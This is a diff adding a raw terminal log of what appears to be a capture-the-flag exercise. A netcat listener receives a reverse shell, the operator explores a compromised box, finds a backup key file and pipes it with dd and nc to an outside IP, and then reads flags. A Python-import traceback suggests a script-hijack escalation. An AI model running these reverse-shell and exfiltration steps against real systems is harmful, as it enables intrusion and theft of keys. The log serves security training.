@@ -1,0 +1,98 @@
+Script started on 2025-04-09 13:00:54+03:00 [COMMAND="rlwrap nc -lnvp 6047" TERM="xterm-256color" TTY="/dev/pts/7" COLUMNS="104" LINES="27"]
+[?2004hlistening on [any] 6047 ...
+[Kconnect to [172.31.95.146] from (UNKNOWN) [172.31.80.1] 6815
+$ [K$ [K[?2004h$ id[?2004l[C[C[K[?2004hid
+[Kuid=1000(will) gid=1000(will) groups=1000(will),4(adm)
+[K$ [K$ [K[?2004h$ ls[?2004l[C[C[K[?2004hls
+[Kcmd.py
+__pycache__
+will_script.py
+[K$ [K$ [K[?2004h$ cd[?2004l[C[C[K[?2004hcd
+[K$ [K$ [K[?2004h$ ls[?2004l[C[C[K[?2004hls
+[Kcow.jpg
+flag_5.txt
+note.txt
+scripts
+[K$ [K$ [K[?2004h$ cat flag_5.txt[C[C[?2004l[C[C[K[?2004hcat flag_5.txt
+[Kcat: [Kcat: [Kcat: flag_5.txt: Permission denied
+$ [K$ [K[?2004h$ ls -l[C[C[?2004l[C[C[K[?2004hls -l
+[Ktotal 280
+-rw-r--r-- 1 mat  mat  270433 Dec  3  2020 cow.jpg
+-rw------- 1 mat  mat      37 Dec  3  2020 flag_5.txt
+-rw-r--r-- 1 will will    141 Dec  3  2020 note.txt
+drwxrwxr-x 3 will will   4096 Apr  9 10:09 scripts
+[K$ [K$ [K[?2004h$ ls -al[C[C[?2004l[C[C[K[?2004hls -al
+[Ktotal 312
+drwxr-xr-x 6 mat  mat    4096 Dec  3  2020 .
+drwxr-xr-x 6 root root   4096 Dec  3  2020 ..
+lrwxrwxrwx 1 root root      9 Dec  3  2020 .bash_history -> /dev/null
+-rw-r--r-- 1 mat  mat     220 Dec  3  2020 .bash_logout
+-rw-r--r-- 1 mat  mat    3771 Dec  3  2020 .bashrc
+drwx------ 2 mat  mat    4096 Dec  3  2020 .cache
+-rw-r--r-- 1 mat  mat  270433 Dec  3  2020 cow.jpg
+-rw------- 1 mat  mat      37 Dec  3  2020 flag_5.txt
+drwx------ 3 mat  mat    4096 Dec  3  2020 .gnupg
+drwxrwxr-x 3 mat  mat    4096 Dec  3  2020 .local
+-rw-r--r-- 1 will will    141 Dec  3  2020 note.txt
+-rw-r--r-- 1 mat  mat     807 Dec  3  2020 .profile
+drwxrwxr-x 3 will will   4096 Apr  9 10:09 scripts
+[K$ [K$ [K[?2004h$ cat note.txt[C[C[?2004l[C[C[K[?2004hcat note.txt
+[KHi Mat,
+
+I've set up your sudo rights to use the python script as my user. You can only run the script with sudo so it should be safe.
+
+Will
+[K$ [K$ [K[?2004h$ sudo -l[C[C[?2004l[C[C[K[?2004hsudo -l
+[K[K[?2004h[?2004l[?2004h
+[K[K[?2004hid[?2004l[K[?2004hid
+[K
+[?2004l
+Script done on 2025-04-09 13:10:42+03:00 [COMMAND_EXIT_CODE="1"]
+Script started on 2025-04-09 13:10:45+03:00 [COMMAND="rlwrap nc -lnvp 6047" TERM="xterm-256color" TTY="/dev/pts/7" COLUMNS="104" LINES="27"]
+[?2004hlistening on [any] 6047 ...
+[Kconnect to [172.31.95.146] from (UNKNOWN) [172.31.80.1] 6823
+$ [K$ [K[?2004h$ ls[?2004l[C[C[K[?2004hls
+[Kcmd.py
+__pycache__
+will_script.py
+[K$ [K$ [K[?2004h$ cd /opt[C[C[?2004l[C[C[K[?2004hcd /opt
+[K$ [K$ [K[?2004h$ ls[?2004l[C[C[K[?2004hls
+[Kbackups
+[K$ [K$ [K[?2004h$ cd a[Kbackups[C[C[?2004l[C[C[K[?2004hcd backups
+[K$ [K$ [K[?2004h$ ls[?2004l[C[C[K[?2004hls
+[Kkey.b64
+[K$ [K$ [K[?2004h$ which dd[C[C[?2004l[C[C[K[?2004hwhich dd
+[K/bin/dd
+[K$ [K$ [K[?2004h$ which nc[C[C[?2004l[C[C[K[?2004hwhich nc
+[K/bin/nc
+[K$ [K$ [K[?2004h$ dd if [K=[7mkey.b64[27mkey.b64 status=progress | nc 10.8.61.245 4444 [K[C[C[?2004l[C[C[K[?2004hdd if=key.b64 status=progress | nc 10.8.61.245 4444
+[K4+1 records in
+4+1 records out
+[K2270 bytes (2.3 kB, 2.2 KiB) copied, 0.00119293 s, 1.9 MB/s
+[K$ [K$ [K[?2004h$ c[Kcd[?2004l[C[C[K[?2004hcd
+[K$ [K$ [K[?2004h$ ls[?2004l[C[C[K[?2004hls
+[Kcow.jpg
+flag_5.txt
+note.txt
+scripts
+[K$ [K$ [K[?2004h$ ca [Kt flag_5/[K.txt[C[C[?2004l[C[C[K[?2004hcat flag_5.txt
+[Kcat: [Kcat: [Kcat: flag_5.txt: Permission denied
+$ [K$ [K[?2004h$ ls[?2004l[C[C[K[?2004hls
+[Kcow.jpg
+flag_5.txt
+note.txt
+scripts
+[K$ [K$ [K[?2004h$ id[?2004l[C[C[K[?2004hid
+[Kuid=1000(will) gid=1000(will) groups=1000(will),4(adm)
+[K$ [K$ [K[?2004h$ cd /home/will[C[C[?2004l[C[C[K[?2004hcd /home/will
+[K$ [K$ [K[?2004h$ ls[?2004l[C[C[K[?2004hls
+[Kflag_6.txt
+[K$ [K$ [K[?2004h$ cat flag_6.txt[C[C[?2004l[C[C[K[?2004hcat flag_6.txt
+[KFLAG{but_i_thought_my_script_was_secure}
+[K$ [K$ [K[?2004h$ exit[C[C[?2004l[C[C[K[?2004hexit
+[KTraceback (most recent call last):
+  File "/home/mat/scripts/will_script.py", line 3, in <module>
+    from cmd import get_command
+ImportError: cannot import name 'get_command'
+[?2004l
+Script done on 2025-04-09 13:19:58+03:00 [COMMAND_EXIT_CODE="0"]
